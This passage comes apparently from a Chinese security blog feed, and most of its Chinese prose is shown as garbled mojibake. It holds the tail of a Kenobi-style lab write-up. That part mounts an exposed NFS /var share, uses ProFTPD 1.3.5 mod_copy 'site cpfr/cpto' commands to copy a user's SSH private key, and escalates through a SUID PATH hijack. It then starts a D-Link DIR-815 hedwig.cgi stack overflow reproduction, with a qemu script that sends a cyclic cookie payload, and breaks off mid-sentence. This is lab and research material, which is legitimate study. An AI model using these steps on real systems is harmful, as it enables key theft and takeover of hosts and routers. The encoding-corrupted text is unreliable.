server will run.UserkenobiGroupkenobi# To cause every FTP user to be "jailed" (chrooted) into their home# directory, uncomment this line.#DefaultRoot ~# Normally, we want files to be overwriteable.AllowOverwriteon# Bar use of SITE CHMOD by default&lt;Limit SITE_CHMOD>  DenyAll&lt;/Limit># A basic anonymous configuration, no upload directories.  If you do not# want anonymous users, simply delete this entire &lt;Anonymous> section.&lt;Anonymous ~ftp>  Userftp  Groupftp  # We want clients to be able to login with "anonymous" as well as "ftp"  UserAliasanonymous ftp  # Limit the maximum number of anonymous logins  MaxClients10  # We want 'welcome.msg' displayed at login, and '.message' displayed  # in each newly chdired directory.  DisplayLoginwelcome.msg  DisplayChdir.message  # Limit WRITE everywhere in the anonymous chroot  &lt;Limit WRITE>    DenyAll  &lt;/Limit>&lt;/Anonymous>## Sample configuration file for the Samba suite for Debian GNU/Linux.### This is the main Samba configuration file. You should read the# smb.conf(5) manual page in order to understand the options listed# here. Samba has a huge number of configurable options most of which # are not shown in this example## Some options that are often worth tuning have been included as# commented-out examples in this file.#  - When such options are commented with ";", the proposed setting#    differs from the default Samba behaviour#  - When commented with "#", the proposed setting is the default#    behaviour of Samba but the option is considered important#    enough to be mentioned here## NOTE: Whenever you modify this file you should run the command# "testparm" to check that you have not made any basic syntactic # errors. #======================= Global Settings =======================......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜¯å…³äº ProFTPD æœåŠ¡çš„é…ç½®æ–‡ä»¶ï¼Œå¯å‘½åä¸º proftpd.conf ä»¥å®é™…ä½¿ç”¨<br><img src="/Red_FILE/337ceb5493e57ac85565b2e12e502bb4_MD5.jpeg"></p><p>nfsæŒ‚è½½çš„ç›®å½•åä¸º &#x2F;varï¼Œå°è¯•æŒ‚è½½<br><img src="/Red_FILE/644c5c6674519ca8757467af8ae4373b_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs IP:var /tmp/mount/ <span class="token parameter variable">-nolock</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">â”Œâ”€â”€(x1nriã‰¿X1NRI)-[/tmp/mount]                                                                                                                                                      â””â”€$ tree -L 2                                                                                                                                                                       .                                                                                                                                                                                   â”œâ”€â”€ backups                                                                                                                                                                         â”‚   â””â”€â”€ apt.extended_states.0                                                                                                                                                       â”œâ”€â”€ cache                                                                                                                                                                           â”‚   â”œâ”€â”€ apache2                                                                                                                                                                     â”‚   â”œâ”€â”€ apparmor                             â”‚   â”œâ”€â”€ apt                                  â”‚   â”œâ”€â”€ debconf                              â”‚   â”œâ”€â”€ ldconfig                             â”‚   â”œâ”€â”€ samba                                â”‚   â””â”€â”€ snapd                                â”œâ”€â”€ crash                                    â”œâ”€â”€ lib                                      â”‚   â”œâ”€â”€ apache2                              â”‚   â”œâ”€â”€ apparmor                             â”‚   â”œâ”€â”€ apt                                  â”‚   â”œâ”€â”€ dbus                                 â”‚   â”œâ”€â”€ dhcp                                 â”‚   â”œâ”€â”€ dpkg                                 â”‚   â”œâ”€â”€ git                                  â”‚   â”œâ”€â”€ initramfs-toolsâ”‚   â”œâ”€â”€ initscripts                          â”‚   â”œâ”€â”€ insserv                              â”‚   â”œâ”€â”€ locales                              â”‚   â”œâ”€â”€ logrotate                            â”‚   â”œâ”€â”€ lxcfs                                â”‚   â”œâ”€â”€ lxd                                  â”‚   â”œâ”€â”€ mdadm                                â”‚   â”œâ”€â”€ misc  â”‚   â”œâ”€â”€ nfs                                  â”‚   â”œâ”€â”€ os-prober                            â”‚   â”œâ”€â”€ pam                                  â”‚   â”œâ”€â”€ plymouth                             â”‚   â”œâ”€â”€ polkit-1                             â”‚   â”œâ”€â”€ python                               â”‚   â”œâ”€â”€ resolvconf                           â”‚   â”œâ”€â”€ samba                                â”‚   â”œâ”€â”€ sgml-base                            â”‚   â”œâ”€â”€ snapd                                â”‚   â”œâ”€â”€ sudo                                 â”‚   â”œâ”€â”€ systemd                              â”‚   â”œâ”€â”€ ubuntu-release-upgraderâ”‚   â”œâ”€â”€ ucf                                  â”‚   â”œâ”€â”€ update-manager                       â”‚   â”œâ”€â”€ update-notifierâ”‚   â”œâ”€â”€ update-rc.d                          â”‚   â”œâ”€â”€ urandom                              â”‚   â”œâ”€â”€ ureadahead                           â”‚   â”œâ”€â”€ usbutils                             â”‚   â”œâ”€â”€ vim                                  â”‚   â””â”€â”€ xml-core                             â”œâ”€â”€ local                                    â”œâ”€â”€ lock -> /run/lock                        â”œâ”€â”€ log                                                                                                                                                                             â”‚   â”œâ”€â”€ alternatives.log                                                                                                                                                            â”‚   â”œâ”€â”€ apache2                                                                                                                                                                     â”‚   â”œâ”€â”€ apt                                                                                                                                                                         â”‚   â”œâ”€â”€ auth.log                                                                                                                                                                    â”‚   â”œâ”€â”€ bootstrap.log                                                                                                                                                               â”‚   â”œâ”€â”€ btmp                                                                                                                                                                        â”‚   â”œâ”€â”€ dist-upgrade                         â”‚   â”œâ”€â”€ dmesg                                â”‚   â”œâ”€â”€ dpkg.log                             â”‚   â”œâ”€â”€ faillog                              â”‚   â”œâ”€â”€ fsck                                 â”‚   â”œâ”€â”€ installer                            â”‚   â”œâ”€â”€ kern.log                             â”‚   â”œâ”€â”€ lastlog                              â”‚   â”œâ”€â”€ lxd                                  â”‚   â”œâ”€â”€ samba                                â”‚   â”œâ”€â”€ syslog                               â”‚   â”œâ”€â”€ unattended-upgradesâ”‚   â””â”€â”€ wtmp                                 â”œâ”€â”€ mail                                     â”œâ”€â”€ opt                                      â”œâ”€â”€ run -> /run                              â”œâ”€â”€ snap                                     â”œâ”€â”€ spool                                    â”‚   â”œâ”€â”€ cron                                 â”‚   â”œâ”€â”€ mail -> ../mailâ”‚   â”œâ”€â”€ rsyslog                              â”‚   â””â”€â”€ samba                                â”œâ”€â”€ tmp      â”‚   â”œâ”€â”€ systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktMâ”‚   â”œâ”€â”€ systemd-private-5500f667562f4ca398e68a1a400ee47c-systemd-timesyncd.service-t53kKaâ”‚   â”œâ”€â”€ systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Awâ”‚   â””â”€â”€ systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdnâ””â”€â”€ www    â””â”€â”€ html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°äº†ç½‘ç«™çš„æºç ï¼Œçº¯é™æ€é¡µé¢ğŸ˜“</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">â”Œâ”€â”€(x1nriã‰¿X1NRI)-[/tmp/mount]â””â”€$ ls ./www/html    admin.html  image.gif  image.jpg  index.html  robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ•è·åˆ° ftp çš„ç”¨æˆ·åæ˜¯ <code>kenobi</code> ï¼Œè¿è¡Œåœ¨21ç«¯å£ï¼Œå°è¯•åŒ¿åç™»å½•ï¼Œç»“æœè¦å‘æˆ‘è¦é‚®ç®±<br><img src="/Red_FILE/e12818a25e85662d460f174860b3fb8b_MD5.jpeg"><br>æˆ‘å›å»é‡æ–°çœ‹äº†çœ‹æŒ‚è½½ç‚¹ä¸‹mailæ–‡ä»¶å¤¹æœ‰æ²¡æœ‰ä»€ä¹ˆé‚®ä»¶ä¿¡æ¯ï¼Œå¯æƒœæ˜¯ç©ºçš„</p><p>å°è¯• hydra çˆ†ä¸€ä¸‹å¼±å£ä»¤ï¼Œä½†æœªæœ</p><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>å¥½åƒé™·å…¥äº†ç»å¢ƒ</p><p>é‡æ–°å®¡è§†å¼€æ”¾çš„ç«¯å£ï¼Œåœ¨111è¿è¡Œç€ rpcbind</p><blockquote><p>rpcbindæ˜¯NFSä¸­ç”¨æ¥è¿›è¡Œæ¶ˆæ¯é€šçŸ¥çš„æœåŠ¡ï¼Œä¸”éœ€è¦NFSé…ç½®å¼€å¯ rpcbind_enable&#x3D;â€œYESâ€ã€‚<br>NFSåŸºäºRPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ï¼ŒNFSæœ¬èº«æ²¡æœ‰æä¾›ä¼ è¾“æœºåˆ¶ï¼Œä¼ è¾“æœºåˆ¶é€šè¿‡RPCå®ç°ï¼ŒRPCæœåŠ¡åœ¨rhel6ä¸­æ˜¯rpcbindï¼Œåœ¨rhel5ä¸­æ˜¯portmapï¼Œrpcç«¯å£å·111ï¼Œnfsç«¯å£å·2049</p></blockquote><p>ä¼šä¸ä¼šæœ‰CVEï¼ŸProFTPDçš„ç‰ˆæœ¬æ˜¯ 1.3.5 ï¼Œä¸€æœè¿˜çœŸæœ‰ï¼š<a href="https://github.com/t0kx/exploit-CVE-2015-3306">t0kx&#x2F;exploit-CVE-2015-3306: ProFTPd 1.3.5 - (mod_copy) Remote Command Execution exploit and vulnerable container (github.com)</a></p><blockquote><p>ProFTPD 1.3.5ä¸­çš„ mod_copy æ¨¡å—å…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡ç«™ç‚¹ <code>site cpfr</code> å’Œ <code>site cpto</code> å‘½ä»¤ï¼Œå¯ç”¨äºå°†æ–‡ä»¶&#x2F;ç›®å½•ä»æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªä½ç½®å¤åˆ¶åˆ°æœåŠ¡å™¨çš„å¦ä¸€ä¸ªä½ç½®ï¼Œä¸”è°ƒç”¨è¯¥å‘½ä»¤æ— éœ€ç™»å½•</p></blockquote><p>å¦‚æœåˆ©ç”¨è¯¥æ¼æ´æ‹·è´ä¸€äº›æ•æ„Ÿä¿¡æ¯åˆ°&#x2F;varä¸‹ï¼ˆæ¯”å¦‚sshçš„ç§é’¥ï¼‰ï¼Œæˆ‘ä»¬å†æŒ‚è½½&#x2F;varæ–‡ä»¶å¤¹ï¼Œå°±èƒ½æ‹¿åˆ° id_rsa</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">ftp> site cpfr /home/kenobi/.ssh/id_rsa350 File or directory exists, ready for destination nameftp> site cpto /var/tmp/id_rsa250 Copy successful<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å·²çŸ¥ftpçš„ç”¨æˆ·åæ˜¯kenobiï¼ŒçŒœæƒ³sshç”¨æˆ·åå¯èƒ½ä¹Ÿä¸€æ ·</p><p>èµ‹äºˆ600ï¼Œç™»å½•æ‹¿ä¸‹ä¸»æœºæƒé™<br><img src="/Red_FILE/cfa936b28bcde06c40d6b49e89d92756_MD5.jpeg"></p><p>è¯¥ä¸»æœºåªæœ‰rootå’Œkenobiä¸¤ä¸ªè´¦æˆ·</p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>å¯åŠ¨ python-serverï¼Œä¸Šè„šæœ¬æ”¶é›†ä¿¡æ¯</p><p>Ubuntu 16.04.6 LTSï¼Œ4.8.0-58-generic çš„å†…æ ¸</p><p>å‘ç°ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶menuå…·æœ‰SUID<br><img src="/Red_FILE/1493e02a75a38eb7f27248259ffadbe0_MD5.jpeg"></p><p><img src="/Red_FILE/32ad9df8d2987ba05041b3b0aca6294b_MD5.jpeg"></p><p>menu1 å®ç°äº† curlï¼Œmenu2 å®ç°äº† uname -rï¼Œmenu3 å®ç°äº† ifconfig</p><p>æˆ‘é€‰æ‹©æ‹¿menu2å¼€åˆ€ï¼Œåˆ©ç”¨PATHå®ç°ææƒ<br><img src="/Red_FILE/9b3bdf36e6bd4493cf8e55a6987b81f2_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link DIR-815 è·¯ç”±å™¨å¤šæ¬¡æ ˆæº¢å‡ºæ¼æ´å¤ç° (CNVD-2013-11625)</title>
      <link href="/2024/04/20/D-Link%20DIR-815%20%E8%B7%AF%E7%94%B1%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20(CNVD-2013-11625)/"/>
      <url>/2024/04/20/D-Link%20DIR-815%20%E8%B7%AF%E7%94%B1%E5%99%A8%E5%A4%9A%E6%AC%A1%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20(CNVD-2013-11625)/</url>
      
        <content type="html"><![CDATA[<blockquote><p>D-Link DIR-645 â€œpost_login.xmlâ€ï¼Œâ€hedwig.cgiâ€ï¼Œâ€authentication.cgiâ€ä¸æ­£ç¡®è¿‡æ»¤ç”¨æˆ·æäº¤çš„å‚æ•°æ•°æ®ï¼Œå…è®¸è¿œç¨‹æ”»å‡»è€…åˆ©ç”¨æ¼æ´æäº¤ç‰¹åˆ¶è¯·æ±‚è§¦å‘ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä½¿åº”ç”¨ç¨‹åºåœæ­¢å“åº”ï¼Œé€ æˆæ‹’ç»æœåŠ¡æ”»å‡»ã€‚<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2013-11625">å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å° (cnvd.org.cn)</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_0">[åŸåˆ›] ä»é›¶å¼€å§‹å¤ç° DIR-815 æ ˆæº¢å‡ºæ¼æ´-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p></blockquote><p><img src="/RW_FILE/af921f3877f0ac8864d8603513ea3495_MD5.jpeg"></p><h1 id="ä¸€ã€æ¼æ´åˆ†æ"><a href="#ä¸€ã€æ¼æ´åˆ†æ" class="headerlink" title="ä¸€ã€æ¼æ´åˆ†æ"></a>ä¸€ã€æ¼æ´åˆ†æ</h1><h2 id="å›ºä»¶è§£å‹"><a href="#å›ºä»¶è§£å‹" class="headerlink" title="å›ºä»¶è§£å‹"></a>å›ºä»¶è§£å‹</h2><p>å…ˆè§£å‹å›ºä»¶ï¼Œä½†æ˜¯å‡ºç°é—®é¢˜ï¼Œä¼¼ä¹æ˜¯å› ä¸ºåœ¨æå–æ–‡ä»¶æ—¶ï¼Œæœ‰ç¬¦å·é“¾æ¥ï¼ˆsymlinkï¼‰æŒ‡å‘äº†æå–ç›®å½•ä¹‹å¤–çš„ä½ç½®ã€‚å‡ºäºå®‰å…¨è€ƒè™‘binwalkä¼šå°†æ‰€æœ‰é“¾æ¥ç½®ä¸º&#x2F;dev&#x2F;nullï¼Œå› ä¸ºè¿™æ ·çš„é“¾æ¥å¯èƒ½ä¼šå¯¼è‡´æå–è¿‡ç¨‹è®¿é—®åˆ°æ•æ„Ÿæˆ–ä¸ç›¸å…³çš„æ–‡ä»¶ç³»ç»Ÿéƒ¨åˆ†ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">WARNING: Symlink points outside of the extraction directory: /home/iot/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root/tmp -> /var/tmp; changing link target to /dev/null for security purposes.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£å†³åŠæ³•æ˜¯æ·»åŠ å‚æ•°<code>--preserve-symlinks</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iot@iot-virtual-machine:~/dir-815$ binwalk --preserve-symlinks <span class="token parameter variable">-Me</span> ./DIR-815A1_FW101SSB03.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ ¹æ®å®˜æ–¹æç¤ºï¼Œæ¼æ´å­˜åœ¨äº<code>hedwig.cgi</code>ä¸­</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iot@iot-virtual-machine:~/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root$ <span class="token function">find</span> ./ <span class="token parameter variable">-name</span> <span class="token string">'hedwig.cgi'</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null./htdocs/web/hedwig.cgiiot@iot-virtual-machine:~/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root$ <span class="token function">file</span> ./htdocs/web/hedwig.cgi./htdocs/web/hedwig.cgi: broken symbolic <span class="token function">link</span> to /htdocs/cgibiniot@iot-virtual-machine:~/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root$ <span class="token function">file</span> ./htdocs/cgibin./htdocs/cgibin: ELF <span class="token number">32</span>-bit LSB executable, MIPS, MIPS32 version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹è§ï¼Œ<code>/htdocs/web/hedwig.cgi</code>æ˜¯<code>/htdocs/cgibin</code>çš„è½¯é“¾æ¥ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦é€†å‘åˆ†æçš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯<code>/htdocs/cgibin</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªMIPS32çš„å°ç«¯åºç¨‹åºã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œçš„æ‰€æœ‰.cgiéƒ½æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iot@iot-virtual-machine:~/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token variable"><span class="token variable">`</span><span class="token function">find</span> ./ <span class="token parameter variable">-name</span> <span class="token string">"*.cgi"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token variable">`</span></span>lrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/captcha.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/conntrack.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/dlcfg.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/fwup.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/hedwig.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/pigwidgeon.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/seama.cgi -<span class="token operator">></span> /htdocs/cgibinlrwxrwxrwx <span class="token number">1</span> iot iot <span class="token number">14</span>  <span class="token number">3</span>æœˆ <span class="token number">26</span> <span class="token number">18</span>:05 ./htdocs/web/service.cgi -<span class="token operator">></span> /htdocs/cgibin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iot@iot-virtual-machine:~/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root$ checksec ./htdocs/cgibin<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/iot/dir-815/_DIR-815A1_FW101SSB03.bin.extracted/squashfs-root/htdocs/cgibin'</span>    Arch:     mips-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX unknown - GNU_STACK missing    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>    Stack:    Executable    RWX:      Has RWX segments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å•¥ä¿æŠ¤éƒ½æ²¡æœ‰</p><p>è¿›åˆ° main å‡½æ•°ï¼Œæˆ‘ä»¬å…³æ³¨<code>hedwigcgi_main()</code> ï¼š<br><img src="/RW_FILE/5e602bb78993b47862201e5c751c7c9f_MD5.jpeg"><br>è¿›åˆ°<code>hedwigcgi_main()</code>ï¼š</p><ul><li><p>é¦–å…ˆä¼šè¯»å–ç¯å¢ƒå˜é‡<code>$REQUEST_METHOD</code>ï¼Œå¹¶ä¸”å¿…é¡»æ˜¯<code>POST</code>è¯·æ±‚ã€‚<br><img src="/RW_FILE/58db2b09769f2f66c6af74550ba33528_MD5.jpeg"></p></li><li><p>æ¥ä¸‹æ¥è¿›å…¥åˆ°<code>cgibin_parse_request()</code><br><img src="/RW_FILE/a87b6f9e99c7156708546d20e4a98f38_MD5.jpeg"><br>è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¯¹URLè¿›è¡Œè§£æï¼Œ</p></li></ul><p>æ³¨æ„è¿™é‡Œä¼šè·å–å‡ ä¸ªç¯å¢ƒå˜é‡ï¼Œè™½ç„¶è·Ÿæ¼æ´å…³ç³»ä¸å¤§ä½†æ˜¯ä¸èƒ½æ²¡æœ‰<br><img src="/RW_FILE/2d09bad30bbab99c49f92069e26a8559_MD5.jpeg"></p><ul><li>æ¥ä¸‹æ¥è¿›å…¥<code>sess_get_uid()</code><br>å°†cookieä¸­keyä¸ºâ€œuidâ€çš„valueå€¼ç­›é€‰å‡ºæ¥ï¼Œå¹¶é™„åŠ åˆ°a1å°¾éƒ¨<br><img src="/RW_FILE/d90fe6d28d8cfe6657f25caeb8bd1720_MD5.jpeg"></li></ul><p>æˆ‘ä»¬å›åˆ°ä¸»å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°valueå€¼èµ‹ç»™äº†v4ï¼Œv4åˆèµ‹ç»™äº†stringï¼Œå¹¶é€šè¿‡<code>sprintf()</code>å¤åˆ¶ç»™å˜é‡v27ï¼›ä½†æ˜¯valueçš„é•¿åº¦å¹¶æ²¡æœ‰é™åˆ¶ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´<br><img src="/RW_FILE/7cbcfa599c2d75525c300d37ffdd5fbd_MD5.jpeg"></p><p>è¿˜æ²¡å®Œï¼Œåœ¨ä¸»å‡½æ•°æœ€ååˆç”¨è¿›è¡Œäº†ä¸€æ¬¡å¤åˆ¶ï¼Œv4çš„å€¼åœ¨ä¸­é€”æ²¡æœ‰æ”¹å˜ï¼Œå­˜åœ¨ç¬¬äºŒæ¬¡æ ˆæº¢å‡º<br><img src="/RW_FILE/bb9d35ae70d8b07da576877b70c15ba6_MD5.jpeg"></p><hr><p>å›è¿‡å¤´æ¥çœ‹ï¼Œè¦è¾¾åˆ°æº¢å‡ºç‚¹æœ‰å‡ ä¸ªæ¡ä»¶åˆ¤æ–­ï¼š</p><ol><li>éœ€è¦æ‰“å¼€<code>/var/tmp/temp.xml</code>æ–‡ä»¶ï¼Œåœ¨çœŸæœºä¸Šæ˜¯å­˜åœ¨&#x2F;var&#x2F;tmpæ–‡ä»¶å¤¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åˆ›å»º<br><img src="/RW_FILE/04265fc3a449a4630f77bb7256f1539e_MD5.jpeg"></li><li>è¿™é‡Œæœ‰ä¸€ä¸ªflagä½ï¼Œéœ€è¦éç©ºï¼š<br><img src="/RW_FILE/f4b0d1129fe7917b512c9d6156112b7a_MD5.jpeg"><br>äº¤å‰å¼•ç”¨å‘ç°å…¶åœ¨<code>sub_409A6C()</code>ä¸­è¢«èµ‹å€¼<br><img src="/RW_FILE/0b307934ea0b33a01b01e619e1dd12e5_MD5.jpeg"><br>å†äº¤å‰å¼•ç”¨ï¼Œå…¶åœ°å€æ˜¯ä½œä¸º<code>cgibin_parse_request()</code>çš„ä¸€ä¸ªå‚æ•°<br><img src="/RW_FILE/e5d853319ce46599ccf0cccc20efd5b3_MD5.jpeg"></li></ol><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="qemu-ç”¨æˆ·æ¨¡å¼å¤ç°"><a href="#qemu-ç”¨æˆ·æ¨¡å¼å¤ç°" class="headerlink" title="qemu ç”¨æˆ·æ¨¡å¼å¤ç°"></a>qemu ç”¨æˆ·æ¨¡å¼å¤ç°</h2><p>é¦–å…ˆ<code>cyclic 2000 &gt; payload</code>ï¼Œå°†ç”Ÿæˆçš„<code>2000</code>ä¸ªå­—ç¬¦å­˜æ”¾åˆ°<code>payload</code>æ–‡ä»¶ä¸­ï¼Œå†ç”¨ä»¥ä¸‹<code>shell</code>è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span> <span class="token assign-left variable">INPUT</span><span class="token operator">=</span><span class="token string">"winmt=pwner"</span><span class="token assign-left variable">LEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-c</span><span class="token variable">)</span></span><span class="token assign-left variable">cookie</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span> <span class="token builtin class-name">echo</span> <span class="token variable">$INPUT</span> <span class="token operator">|</span> qemu-mipsel <span class="token parameter variable">-L</span> ./ <span class="token parameter variable">-0</span> <span class="token string">"hedwig.cgi"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token variable">$LEN</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token variable">$cookie</span> <span class="token parameter variable">-E</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span> <span class="token parameter variable">-g</span> <span class="token number">1234</span> ./htdocs/cgibin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>echo -n</code>è¡¨ç¤ºè¾“å‡ºä¸æ·»åŠ æ¢è¡Œç¬¦ï¼Œ<code>wc 